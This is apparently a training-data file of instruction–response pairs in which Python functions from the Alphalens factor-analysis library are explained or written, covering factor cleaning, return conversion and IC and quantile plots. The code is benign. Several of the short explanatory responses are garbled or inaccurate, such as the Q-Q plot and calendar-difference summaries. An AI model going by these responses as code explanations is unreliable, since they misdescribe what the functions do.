{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_clean_factor(factor,\n                     forward_returns,\n                     groupby=None,\n                     binning_by_group=False,\n                     quantiles=5,\n                     bins=None,\n                     groupby_labels=None,\n                     max_loss=0.35,\n                     zero_aware=False):\n    \"\"\"\n    Formats the factor data, forward return data, and group mappings into a\n    DataFrame that contains aligned MultiIndex indices of timestamp and asset.\n    The returned data will be formatted to be suitable for Alphalens functions.\n\n    It is safe to skip a call to this function and still make use of Alphalens\n    functionalities as long as the factor data conforms to the format returned\n    from get_clean_factor_and_forward_returns and documented here\n\n    Parameters\n    ----------\n    factor : pd.Series - MultiIndex\n        A MultiIndex Series indexed by timestamp (level 0) and asset\n        (level 1), containing the values for a single alpha factor.\n        ::\n            -----------------------------------\n                date    |    asset   |\n            -----------------------------------\n                        |   AAPL     |   0.5\n                        -----------------------\n                        |   BA       |  -1.1\n                        -----------------------\n            2014-01-01  |   CMG      |   1.7\n                        -----------------------\n                        |   DAL      |  -0.1\n                        -----------------------\n                        |   LULU     |   2.7\n                        -----------------------\n\n    forward_returns : pd.DataFrame - MultiIndex\n        A MultiIndex DataFrame indexed by timestamp (level 0) and asset\n        (level 1), containing the forward returns for assets.\n        Forward returns column names must follow the format accepted by\n        pd.Timedelta (e.g. '1D', '30m', '3h15m', '1D1h', etc).\n        'date' index freq property must be set to a trading calendar\n        (pandas DateOffset), see infer_trading_calendar for more details.\n        This information is currently used only in cumulative returns\n        computation\n        ::\n            ---------------------------------------\n                       |       | 1D  | 5D  | 10D\n            ---------------------------------------\n                date   | asset |     |     |\n            ---------------------------------------\n                       | AAPL  | 0.09|-0.01|-0.079\n                       ----------------------------\n                       | BA    | 0.02| 0.06| 0.020\n                       ----------------------------\n            2014-01-01 | CMG   | 0.03| 0.09| 0.036\n                       ----------------------------\n                       | DAL   |-0.02|-0.06|-0.029\n                       ----------------------------\n                       | LULU  |-0.03| 0.05|-0.009\n                       ----------------------------\n\n    groupby : pd.Series - MultiIndex or dict\n        Either A MultiIndex Series indexed by date and asset,\n        containing the period wise group codes for each asset, or\n        a dict of asset to group mappings. If a dict is passed,\n        it is assumed that group mappings are unchanged for the\n        entire time period of the passed factor data.\n    binning_by_group : bool\n        If True, compute quantile buckets separately for each group.\n        This is useful when the factor values range vary considerably\n        across gorups so that it is wise to make the binning group relative.\n        You should probably enable this if the factor is intended\n        to be analyzed for a group neutral portfolio\n    quantiles : int or sequence[float]\n        Number of equal-sized quantile buckets to use in factor bucketing.\n        Alternately sequence of quantiles, allowing non-equal-sized buckets\n        e.g. [0, .10, .5, .90, 1.] or [.05, .5, .95]\n        Only one of 'quantiles' or 'bins' can be not-None\n    bins : int or sequence[float]\n        Number of equal-width (valuewise) bins to use in factor bucketing.\n        Alternately sequence of bin edges allowing for non-uniform bin width\n        e.g. [-4, -2, -0.5, 0, 10]\n        Chooses the buckets to be evenly spaced according to the values\n        themselves. Useful when the factor contains discrete values.\n        Only one of 'quantiles' or 'bins' can be not-None\n    groupby_labels : dict\n        A dictionary keyed by group code with values corresponding\n        to the display name for each group.\n    max_loss : float, optional\n        Maximum percentage (0.00 to 1.00) of factor data dropping allowed,\n        computed comparing the number of items in the input factor index and\n        the number of items in the output DataFrame index.\n        Factor data can be partially dropped due to being flawed itself\n        (e.g. NaNs), not having provided enough price data to compute\n        forward returns for all factor values, or because it is not possible\n        to perform binning.\n        Set max_loss=0 to avoid Exceptions suppression.\n    zero_aware : bool, optional\n        If True, compute quantile buckets separately for positive and negative\n        signal values. This is useful if your signal is centered and zero is\n        the separation between long and short signals, respectively.\n        'quantiles' is None.\n\n    Returns\n    -------\n    merged_data : pd.DataFrame - MultiIndex\n        A MultiIndex Series indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n\n        - forward returns column names follow the format accepted by\n          pd.Timedelta (e.g. '1D', '30m', '3h15m', '1D1h', etc)\n\n        - 'date' index freq property (merged_data.index.levels[0].freq) is the\n          same as that of the input forward returns data. This is currently\n          used only in cumulative returns computation\n        ::\n           -------------------------------------------------------------------\n                      |       | 1D  | 5D  | 10D  |factor|group|factor_quantile\n           -------------------------------------------------------------------\n               date   | asset |     |     |      |      |     |\n           -------------------------------------------------------------------\n                      | AAPL  | 0.09|-0.01|-0.079|  0.5 |  G1 |      3\n                      --------------------------------------------------------\n                      | BA    | 0.02| 0.06| 0.020| -1.1 |  G2 |      5\n                      --------------------------------------------------------\n           2014-01-01 | CMG   | 0.03| 0.09| 0.036|  1.7 |  G2 |      1\n                      --------------------------------------------------------\n                      | DAL   |-0.02|-0.06|-0.029| -0.1 |  G3 |      5\n                      --------------------------------------------------------\n                      | LULU  |-0.03| 0.05|-0.009|  2.7 |  G1 |      2\n                      --------------------------------------------------------\n    \"\"\"\n\n    initial_amount = float(len(factor.index))\n\n    factor_copy = factor.copy()\n    factor_copy.index = factor_copy.index.rename(['date', 'asset'])\n\n    merged_data = forward_returns.copy()\n    merged_data['factor'] = factor_copy\n\n    if groupby is not None:\n        if isinstance(groupby, dict):\n            diff = set(factor_copy.index.get_level_values(\n                'asset')) - set(groupby.keys())\n            if len(diff) > 0:\n                raise KeyError(\n                    \"Assets {} not in group mapping\".format(\n                        list(diff)))\n\n            ss = pd.Series(groupby)\n            groupby = pd.Series(index=factor_copy.index,\n                                data=ss[factor_copy.index.get_level_values(\n                                    'asset')].values)\n\n        if groupby_labels is not None:\n            diff = set(groupby.values) - set(groupby_labels.keys())\n            if len(diff) > 0:\n                raise KeyError(\n                    \"groups {} not in passed group names\".format(\n                        list(diff)))\n\n            sn = pd.Series(groupby_labels)\n            groupby = pd.Series(index=groupby.index,\n                                data=sn[groupby.values].values)\n\n        merged_data['group'] = groupby.astype('category')\n\n    merged_data = merged_data.dropna()\n\n    fwdret_amount = float(len(merged_data.index))\n\n    no_raise = False if max_loss == 0 else True\n    quantile_data = quantize_factor(\n        merged_data,\n        quantiles,\n        bins,\n        binning_by_group,\n        no_raise,\n        zero_aware\n    )\n\n    merged_data['factor_quantile'] = quantile_data\n\n    merged_data = merged_data.dropna()\n\n    binning_amount = float(len(merged_data.index))\n\n    tot_loss = (initial_amount - binning_amount) / initial_amount\n    fwdret_loss = (initial_amount - fwdret_amount) / initial_amount\n    bin_loss = tot_loss - fwdret_loss\n\n    print(\"Dropped %.1f%% entries from factor data: %.1f%% in forward \"\n          \"returns computation and %.1f%% in binning phase \"\n          \"(set max_loss=0 to see potentially suppressed Exceptions).\" %\n          (tot_loss * 100, fwdret_loss * 100, bin_loss * 100))\n\n    if tot_loss > max_loss:\n        message = (\"max_loss (%.1f%%) exceeded %.1f%%, consider increasing it.\"\n                   % (max_loss * 100, tot_loss * 100))\n        raise MaxLossExceededError(message)\n    else:\n        print(\"max_loss is %.1f%%, not exceeded: OK!\" % (max_loss * 100))\n\n    return merged_data", "response": "Returns a DataFrame that represents the factor data and the forward returns for the given group and returns."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_clean_factor_and_forward_returns(factor,\n                                         prices,\n                                         groupby=None,\n                                         binning_by_group=False,\n                                         quantiles=5,\n                                         bins=None,\n                                         periods=(1, 5, 10),\n                                         filter_zscore=20,\n                                         groupby_labels=None,\n                                         max_loss=0.35,\n                                         zero_aware=False,\n                                         cumulative_returns=True):\n    \"\"\"\n    Formats the factor data, pricing data, and group mappings into a DataFrame\n    that contains aligned MultiIndex indices of timestamp and asset. The\n    returned data will be formatted to be suitable for Alphalens functions.\n\n    It is safe to skip a call to this function and still make use of Alphalens\n    functionalities as long as the factor data conforms to the format returned\n    from get_clean_factor_and_forward_returns and documented here\n\n    Parameters\n    ----------\n    factor : pd.Series - MultiIndex\n        A MultiIndex Series indexed by timestamp (level 0) and asset\n        (level 1), containing the values for a single alpha factor.\n        ::\n            -----------------------------------\n                date    |    asset   |\n            -----------------------------------\n                        |   AAPL     |   0.5\n                        -----------------------\n                        |   BA       |  -1.1\n                        -----------------------\n            2014-01-01  |   CMG      |   1.7\n                        -----------------------\n                        |   DAL      |  -0.1\n                        -----------------------\n                        |   LULU     |   2.7\n                        -----------------------\n\n    prices : pd.DataFrame\n        A wide form Pandas DataFrame indexed by timestamp with assets\n        in the columns.\n        Pricing data must span the factor analysis time period plus an\n        additional buffer window that is greater than the maximum number\n        of expected periods in the forward returns calculations.\n        It is important to pass the correct pricing data in depending on\n        what time of period your signal was generated so to avoid lookahead\n        bias, or  delayed calculations.\n        'Prices' must contain at least an entry for each timestamp/asset\n        combination in 'factor'. This entry should reflect the buy price\n        for the assets and usually it is the next available price after the\n        factor is computed but it can also be a later price if the factor is\n        meant to be traded later (e.g. if the factor is computed at market\n        open but traded 1 hour after market open the price information should\n        be 1 hour after market open).\n        'Prices' must also contain entries for timestamps following each\n        timestamp/asset combination in 'factor', as many more timestamps\n        as the maximum value in 'periods'. The asset price after 'period'\n        timestamps will be considered the sell price for that asset when\n        computing 'period' forward returns.\n        ::\n            ----------------------------------------------------\n                        | AAPL |  BA  |  CMG  |  DAL  |  LULU  |\n            ----------------------------------------------------\n               Date     |      |      |       |       |        |\n            ----------------------------------------------------\n            2014-01-01  |605.12| 24.58|  11.72| 54.43 |  37.14 |\n            ----------------------------------------------------\n            2014-01-02  |604.35| 22.23|  12.21| 52.78 |  33.63 |\n            ----------------------------------------------------\n            2014-01-03  |607.94| 21.68|  14.36| 53.94 |  29.37 |\n            ----------------------------------------------------\n\n    groupby : pd.Series - MultiIndex or dict\n        Either A MultiIndex Series indexed by date and asset,\n        containing the period wise group codes for each asset, or\n        a dict of asset to group mappings. If a dict is passed,\n        it is assumed that group mappings are unchanged for the\n        entire time period of the passed factor data.\n    binning_by_group : bool\n        If True, compute quantile buckets separately for each group.\n        This is useful when the factor values range vary considerably\n        across gorups so that it is wise to make the binning group relative.\n        You should probably enable this if the factor is intended\n        to be analyzed for a group neutral portfolio\n    quantiles : int or sequence[float]\n        Number of equal-sized quantile buckets to use in factor bucketing.\n        Alternately sequence of quantiles, allowing non-equal-sized buckets\n        e.g. [0, .10, .5, .90, 1.] or [.05, .5, .95]\n        Only one of 'quantiles' or 'bins' can be not-None\n    bins : int or sequence[float]\n        Number of equal-width (valuewise) bins to use in factor bucketing.\n        Alternately sequence of bin edges allowing for non-uniform bin width\n        e.g. [-4, -2, -0.5, 0, 10]\n        Chooses the buckets to be evenly spaced according to the values\n        themselves. Useful when the factor contains discrete values.\n        Only one of 'quantiles' or 'bins' can be not-None\n    periods : sequence[int]\n        periods to compute forward returns on.\n    filter_zscore : int or float, optional\n        Sets forward returns greater than X standard deviations\n        from the the mean to nan. Set it to 'None' to avoid filtering.\n        Caution: this outlier filtering incorporates lookahead bias.\n    groupby_labels : dict\n        A dictionary keyed by group code with values corresponding\n        to the display name for each group.\n    max_loss : float, optional\n        Maximum percentage (0.00 to 1.00) of factor data dropping allowed,\n        computed comparing the number of items in the input factor index and\n        the number of items in the output DataFrame index.\n        Factor data can be partially dropped due to being flawed itself\n        (e.g. NaNs), not having provided enough price data to compute\n        forward returns for all factor values, or because it is not possible\n        to perform binning.\n        Set max_loss=0 to avoid Exceptions suppression.\n    zero_aware : bool, optional\n        If True, compute quantile buckets separately for positive and negative\n        signal values. This is useful if your signal is centered and zero is\n        the separation between long and short signals, respectively.\n    cumulative_returns : bool, optional\n        If True, forward returns columns will contain cumulative returns.\n        Setting this to False is useful if you want to analyze how predictive\n        a factor is for a single forward day.\n\n    Returns\n    -------\n    merged_data : pd.DataFrame - MultiIndex\n        A MultiIndex Series indexed by date (level 0) and asset (level 1),\n        containing the values for a single alpha factor, forward returns for\n        each period, the factor quantile/bin that factor value belongs to, and\n        (optionally) the group the asset belongs to.\n        - forward returns column names follow  the format accepted by\n          pd.Timedelta (e.g. '1D', '30m', '3h15m', '1D1h', etc)\n        - 'date' index freq property (merged_data.index.levels[0].freq) will be\n          set to a trading calendar (pandas DateOffset) inferred from the input\n          data (see infer_trading_calendar for more details). This is currently\n          used only in cumulative returns computation\n        ::\n           -------------------------------------------------------------------\n                      |       | 1D  | 5D  | 10D  |factor|group|factor_quantile\n           -------------------------------------------------------------------\n               date   | asset |     |     |      |      |     |\n           -------------------------------------------------------------------\n                      | AAPL  | 0.09|-0.01|-0.079|  0.5 |  G1 |      3\n                      --------------------------------------------------------\n                      | BA    | 0.02| 0.06| 0.020| -1.1 |  G2 |      5\n                      --------------------------------------------------------\n           2014-01-01 | CMG   | 0.03| 0.09| 0.036|  1.7 |  G2 |      1\n                      --------------------------------------------------------\n                      | DAL   |-0.02|-0.06|-0.029| -0.1 |  G3 |      5\n                      --------------------------------------------------------\n                      | LULU  |-0.03| 0.05|-0.009|  2.7 |  G1 |      2\n                      --------------------------------------------------------\n    \"\"\"\n\n    forward_returns = compute_forward_returns(factor, prices, periods,\n                                              filter_zscore,\n                                              cumulative_returns)\n\n    factor_data = get_clean_factor(factor, forward_returns, groupby=groupby,\n                                   groupby_labels=groupby_labels,\n                                   quantiles=quantiles, bins=bins,\n                                   binning_by_group=binning_by_group,\n                                   max_loss=max_loss, zero_aware=zero_aware)\n\n    return factor_data", "response": "Returns a DataFrame containing the factor data pricing data and forward returns for the given factor analysis time period and asset combination."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef rate_of_return(period_ret, base_period):\n    period_len = period_ret.name\n    conversion_factor = (pd.Timedelta(base_period) /\n                         pd.Timedelta(period_len))\n    return period_ret.add(1).pow(conversion_factor).sub(1)", "response": "Convert returns to one_period_len rate of returns"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef std_conversion(period_std, base_period):\n    period_len = period_std.name\n    conversion_factor = (pd.Timedelta(period_len) /\n                         pd.Timedelta(base_period))\n    return period_std / np.sqrt(conversion_factor)", "response": "Returns a dataframe containing one - period_len standard deviation or standard error values corresponding to the return period."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_forward_returns_columns(columns):\n    pattern = re.compile(r\"^(\\d+([Dhms]|ms|us|ns))+$\", re.IGNORECASE)\n    valid_columns = [(pattern.match(col) is not None) for col in columns]\n    return columns[valid_columns]", "response": "Utility that detects and returns the columns that are forward returns\n   "}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef timedelta_to_string(timedelta):\n    c = timedelta.components\n    format = ''\n    if c.days != 0:\n        format += '%dD' % c.days\n    if c.hours > 0:\n        format += '%dh' % c.hours\n    if c.minutes > 0:\n        format += '%dm' % c.minutes\n    if c.seconds > 0:\n        format += '%ds' % c.seconds\n    if c.milliseconds > 0:\n        format += '%dms' % c.milliseconds\n    if c.microseconds > 0:\n        format += '%dus' % c.microseconds\n    if c.nanoseconds > 0:\n        format += '%dns' % c.nanoseconds\n    return format", "response": "Utility that converts a pandas. Timedelta to a string representation of a\n    compatible with pandas. Timedelta constructor format\n   "}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds a timedelta to a specific calendar.", "response": "def add_custom_calendar_timedelta(input, timedelta, freq):\n    \"\"\"\n    Add timedelta to 'input' taking into consideration custom frequency, which\n    is used to deal with custom calendars, such as a trading calendar\n\n    Parameters\n    ----------\n    input : pd.DatetimeIndex or pd.Timestamp\n    timedelta : pd.Timedelta\n    freq : pd.DataOffset (CustomBusinessDay, Day or BusinessDay)\n\n    Returns\n    -------\n    pd.DatetimeIndex or pd.Timestamp\n        input + timedelta\n    \"\"\"\n    if not isinstance(freq, (Day, BusinessDay, CustomBusinessDay)):\n        raise ValueError(\"freq must be Day, BDay or CustomBusinessDay\")\n    days = timedelta.components.days\n    offset = timedelta - pd.Timedelta(days=days)\n    return input + freq * days + offset"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef diff_custom_calendar_timedeltas(start, end, freq):\n    if not isinstance(freq, (Day, BusinessDay, CustomBusinessDay)):\n        raise ValueError(\"freq must be Day, BusinessDay or CustomBusinessDay\")\n\n    weekmask = getattr(freq, 'weekmask', None)\n    holidays = getattr(freq, 'holidays', None)\n\n    if weekmask is None and holidays is None:\n        if isinstance(freq, Day):\n            weekmask = 'Mon Tue Wed Thu Fri Sat Sun'\n            holidays = []\n        elif isinstance(freq, BusinessDay):\n            weekmask = 'Mon Tue Wed Thu Fri'\n            holidays = []\n\n    if weekmask is not None and holidays is not None:\n        # we prefer this method as it is faster\n        actual_days = np.busday_count(np.array(start).astype('datetime64[D]'),\n                                      np.array(end).astype('datetime64[D]'),\n                                      weekmask, holidays)\n    else:\n        # default, it is slow\n        actual_days = pd.date_range(start, end, freq=freq).shape[0] - 1\n        if not freq.onOffset(start):\n            actual_days -= 1\n\n    timediff = end - start\n    delta_days = timediff.components.days - actual_days\n    return timediff - pd.Timedelta(days=delta_days)", "response": "Compute the difference between two pd. Timedelta objects taking into consideration a\n    custom frequency which is used to deal with custom calendars such as a\n    trading calendars and a\n    trading calendars."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef plot_ic_ts(ic, ax=None):\n    ic = ic.copy()\n\n    num_plots = len(ic.columns)\n    if ax is None:\n        f, ax = plt.subplots(num_plots, 1, figsize=(18, num_plots * 7))\n        ax = np.asarray([ax]).flatten()\n\n    ymin, ymax = (None, None)\n    for a, (period_num, ic) in zip(ax, ic.iteritems()):\n        ic.plot(alpha=0.7, ax=a, lw=0.7, color='steelblue')\n        ic.rolling(window=22).mean().plot(\n            ax=a,\n            color='forestgreen',\n            lw=2,\n            alpha=0.8\n        )\n\n        a.set(ylabel='IC', xlabel=\"\")\n        a.set_title(\n            \"{} Period Forward Return Information Coefficient (IC)\"\n            .format(period_num))\n        a.axhline(0.0, linestyle='-', color='black', lw=1, alpha=0.8)\n        a.legend(['IC', '1 month moving avg'], loc='upper right')\n        a.text(.05, .95, \"Mean %.3f \\n Std. %.3f\" % (ic.mean(), ic.std()),\n               fontsize=16,\n               bbox={'facecolor': 'white', 'alpha': 1, 'pad': 5},\n               transform=a.transAxes,\n               verticalalignment='top')\n\n        curr_ymin, curr_ymax = a.get_ylim()\n        ymin = curr_ymin if ymin is None else min(ymin, curr_ymin)\n        ymax = curr_ymax if ymax is None else max(ymax, curr_ymax)\n\n    for a in ax:\n        a.set_ylim([ymin, ymax])\n\n    return ax", "response": "Plots the Spearman Rank Information Coefficient and IC moving average for a given factor."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nplot the Spearman Rank Information Coefficient histogram for a given factor.", "response": "def plot_ic_hist(ic, ax=None):\n    \"\"\"\n    Plots Spearman Rank Information Coefficient histogram for a given factor.\n\n    Parameters\n    ----------\n    ic : pd.DataFrame\n        DataFrame indexed by date, with IC for each forward return.\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n        The axes that were plotted on.\n    \"\"\"\n\n    ic = ic.copy()\n\n    num_plots = len(ic.columns)\n\n    v_spaces = ((num_plots - 1) // 3) + 1\n\n    if ax is None:\n        f, ax = plt.subplots(v_spaces, 3, figsize=(18, v_spaces * 6))\n        ax = ax.flatten()\n\n    for a, (period_num, ic) in zip(ax, ic.iteritems()):\n        sns.distplot(ic.replace(np.nan, 0.), norm_hist=True, ax=a)\n        a.set(title=\"%s Period IC\" % period_num, xlabel='IC')\n        a.set_xlim([-1, 1])\n        a.text(.05, .95, \"Mean %.3f \\n Std. %.3f\" % (ic.mean(), ic.std()),\n               fontsize=16,\n               bbox={'facecolor': 'white', 'alpha': 1, 'pad': 5},\n               transform=a.transAxes,\n               verticalalignment='top')\n        a.axvline(ic.mean(), color='w', linestyle='dashed', linewidth=2)\n\n    if num_plots < len(ax):\n        ax[-1].set_visible(False)\n\n    return ax"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef plot_ic_qq(ic, theoretical_dist=stats.norm, ax=None):\n\n    ic = ic.copy()\n\n    num_plots = len(ic.columns)\n\n    v_spaces = ((num_plots - 1) // 3) + 1\n\n    if ax is None:\n        f, ax = plt.subplots(v_spaces, 3, figsize=(18, v_spaces * 6))\n        ax = ax.flatten()\n\n    if isinstance(theoretical_dist, stats.norm.__class__):\n        dist_name = 'Normal'\n    elif isinstance(theoretical_dist, stats.t.__class__):\n        dist_name = 'T'\n    else:\n        dist_name = 'Theoretical'\n\n    for a, (period_num, ic) in zip(ax, ic.iteritems()):\n        sm.qqplot(ic.replace(np.nan, 0.).values, theoretical_dist, fit=True,\n                  line='45', ax=a)\n        a.set(title=\"{} Period IC {} Dist. Q-Q\".format(\n              period_num, dist_name),\n              ylabel='Observed Quantile',\n              xlabel='{} Distribution Quantile'.format(dist_name))\n\n    return ax", "response": "Plots the relative to theoretical distribution of the terms."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef plot_quantile_returns_bar(mean_ret_by_q,\n                              by_group=False,\n                              ylim_percentiles=None,\n                              ax=None):\n    \"\"\"\n    Plots mean period wise returns for factor quantiles.\n\n    Parameters\n    ----------\n    mean_ret_by_q : pd.DataFrame\n        DataFrame with quantile, (group) and mean period wise return values.\n    by_group : bool\n        Disaggregated figures by group.\n    ylim_percentiles : tuple of integers\n        Percentiles of observed data to use as y limits for plot.\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n        The axes that were plotted on.\n    \"\"\"\n\n    mean_ret_by_q = mean_ret_by_q.copy()\n\n    if ylim_percentiles is not None:\n        ymin = (np.nanpercentile(mean_ret_by_q.values,\n                                 ylim_percentiles[0]) * DECIMAL_TO_BPS)\n        ymax = (np.nanpercentile(mean_ret_by_q.values,\n                                 ylim_percentiles[1]) * DECIMAL_TO_BPS)\n    else:\n        ymin = None\n        ymax = None\n\n    if by_group:\n        num_group = len(\n            mean_ret_by_q.index.get_level_values('group').unique())\n\n        if ax is None:\n            v_spaces = ((num_group - 1) // 2) + 1\n            f, ax = plt.subplots(v_spaces, 2, sharex=False,\n                                 sharey=True, figsize=(18, 6 * v_spaces))\n            ax = ax.flatten()\n\n        for a, (sc, cor) in zip(ax, mean_ret_by_q.groupby(level='group')):\n            (cor.xs(sc, level='group')\n                .multiply(DECIMAL_TO_BPS)\n                .plot(kind='bar', title=sc, ax=a))\n\n            a.set(xlabel='', ylabel='Mean Return (bps)',\n                  ylim=(ymin, ymax))\n\n        if num_group < len(ax):\n            ax[-1].set_visible(False)\n\n        return ax\n\n    else:\n        if ax is None:\n            f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n        (mean_ret_by_q.multiply(DECIMAL_TO_BPS)\n            .plot(kind='bar',\n                  title=\"Mean Period Wise Return By Factor Quantile\", ax=ax))\n        ax.set(xlabel='', ylabel='Mean Return (bps)',\n               ylim=(ymin, ymax))\n\n        return ax", "response": "Plots the mean period wise returns for factor quantiles."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nplot a violin box plot of factor wise returns for factor quantiles.", "response": "def plot_quantile_returns_violin(return_by_q,\n                                 ylim_percentiles=None,\n                                 ax=None):\n    \"\"\"\n    Plots a violin box plot of period wise returns for factor quantiles.\n\n    Parameters\n    ----------\n    return_by_q : pd.DataFrame - MultiIndex\n        DataFrame with date and quantile as rows MultiIndex,\n        forward return windows as columns, returns as values.\n    ylim_percentiles : tuple of integers\n        Percentiles of observed data to use as y limits for plot.\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n        The axes that were plotted on.\n    \"\"\"\n\n    return_by_q = return_by_q.copy()\n\n    if ylim_percentiles is not None:\n        ymin = (np.nanpercentile(return_by_q.values,\n                                 ylim_percentiles[0]) * DECIMAL_TO_BPS)\n        ymax = (np.nanpercentile(return_by_q.values,\n                                 ylim_percentiles[1]) * DECIMAL_TO_BPS)\n    else:\n        ymin = None\n        ymax = None\n\n    if ax is None:\n        f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n    unstacked_dr = (return_by_q\n                    .multiply(DECIMAL_TO_BPS))\n    unstacked_dr.columns = unstacked_dr.columns.set_names('forward_periods')\n    unstacked_dr = unstacked_dr.stack()\n    unstacked_dr.name = 'return'\n    unstacked_dr = unstacked_dr.reset_index()\n\n    sns.violinplot(data=unstacked_dr,\n                   x='factor_quantile',\n                   hue='forward_periods',\n                   y='return',\n                   orient='v',\n                   cut=0,\n                   inner='quartile',\n                   ax=ax)\n    ax.set(xlabel='', ylabel='Return (bps)',\n           title=\"Period Wise Return By Factor Quantile\",\n           ylim=(ymin, ymax))\n\n    ax.axhline(0.0, linestyle='-', color='black', lw=0.7, alpha=0.6)\n\n    return ax"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef plot_mean_quantile_returns_spread_time_series(mean_returns_spread,\n                                                  std_err=None,\n                                                  bandwidth=1,\n                                                  ax=None):\n    \"\"\"\n    Plots mean period wise returns for factor quantiles.\n\n    Parameters\n    ----------\n    mean_returns_spread : pd.Series\n        Series with difference between quantile mean returns by period.\n    std_err : pd.Series\n        Series with standard error of difference between quantile\n        mean returns each period.\n    bandwidth : float\n        Width of displayed error bands in standard deviations.\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n        The axes that were plotted on.\n    \"\"\"\n\n    if isinstance(mean_returns_spread, pd.DataFrame):\n        if ax is None:\n            ax = [None for a in mean_returns_spread.columns]\n\n        ymin, ymax = (None, None)\n        for (i, a), (name, fr_column) in zip(enumerate(ax),\n                                             mean_returns_spread.iteritems()):\n            stdn = None if std_err is None else std_err[name]\n            a = plot_mean_quantile_returns_spread_time_series(fr_column,\n                                                              std_err=stdn,\n                                                              ax=a)\n            ax[i] = a\n            curr_ymin, curr_ymax = a.get_ylim()\n            ymin = curr_ymin if ymin is None else min(ymin, curr_ymin)\n            ymax = curr_ymax if ymax is None else max(ymax, curr_ymax)\n\n        for a in ax:\n            a.set_ylim([ymin, ymax])\n\n        return ax\n\n    if mean_returns_spread.isnull().all():\n        return ax\n\n    periods = mean_returns_spread.name\n    title = ('Top Minus Bottom Quantile Mean Return ({} Period Forward Return)'\n             .format(periods if periods is not None else \"\"))\n\n    if ax is None:\n        f, ax = plt.subplots(figsize=(18, 6))\n\n    mean_returns_spread_bps = mean_returns_spread * DECIMAL_TO_BPS\n\n    mean_returns_spread_bps.plot(alpha=0.4, ax=ax, lw=0.7, color='forestgreen')\n    mean_returns_spread_bps.rolling(window=22).mean().plot(\n        color='orangered',\n        alpha=0.7,\n        ax=ax\n    )\n    ax.legend(['mean returns spread', '1 month moving avg'], loc='upper right')\n\n    if std_err is not None:\n        std_err_bps = std_err * DECIMAL_TO_BPS\n        upper = mean_returns_spread_bps.values + (std_err_bps * bandwidth)\n        lower = mean_returns_spread_bps.values - (std_err_bps * bandwidth)\n        ax.fill_between(mean_returns_spread.index,\n                        lower,\n                        upper,\n                        alpha=0.3,\n                        color='steelblue')\n\n    ylim = np.nanpercentile(abs(mean_returns_spread_bps.values), 95)\n    ax.set(ylabel='Difference In Quantile Mean Return (bps)',\n           xlabel='',\n           title=title,\n           ylim=(-ylim, ylim))\n    ax.axhline(0.0, linestyle='-', color='black', lw=1, alpha=0.8)\n\n    return ax", "response": "Plots the mean period wise returns for factor quantiles."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nplot the Spearman Rank Information Coefficient for a given factor over a given forward returns. Separates by group.", "response": "def plot_ic_by_group(ic_group, ax=None):\n    \"\"\"\n    Plots Spearman Rank Information Coefficient for a given factor over\n    provided forward returns. Separates by group.\n\n    Parameters\n    ----------\n    ic_group : pd.DataFrame\n        group-wise mean period wise returns.\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n        The axes that were plotted on.\n    \"\"\"\n    if ax is None:\n        f, ax = plt.subplots(1, 1, figsize=(18, 6))\n    ic_group.plot(kind='bar', ax=ax)\n\n    ax.set(title=\"Information Coefficient By Group\", xlabel=\"\")\n    ax.set_xticklabels(ic_group.index, rotation=45)\n\n    return ax"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nplot factor rank autocorrelation over time.", "response": "def plot_factor_rank_auto_correlation(factor_autocorrelation,\n                                      period=1,\n                                      ax=None):\n    \"\"\"\n    Plots factor rank autocorrelation over time.\n    See factor_rank_autocorrelation for more details.\n\n    Parameters\n    ----------\n    factor_autocorrelation : pd.Series\n        Rolling 1 period (defined by time_rule) autocorrelation\n        of factor values.\n    period: int, optional\n        Period over which the autocorrelation is calculated\n    ax : matplotlib.Axes, optional\n        Axes upon which to plot.\n\n    Returns\n    -------\n    ax : matplotlib.Axes\n        The axes that were plotted on.\n    \"\"\"\n    if ax is None:\n        f, ax = plt.subplots(1, 1, figsize=(18, 6))\n\n    factor_autocorrelation.plot(title='{} Period Factor Rank Autocorrelation'\n                                .format(period), ax=ax)\n    ax.set(ylabel='Autocorrelation Coefficient', xlabel='')\n    ax.axhline(0.0, linestyle='-', color='black', lw=1)\n    ax.text(.05, .95, \"Mean %.3f\" % factor_autocorrelation.mean(),\n            fontsize=16,\n            bbox={'facecolor': 'white', 'alpha': 1, 'pad': 5},\n            transform=ax.transAxes,\n            verticalalignment='top')\n\n    return ax"}
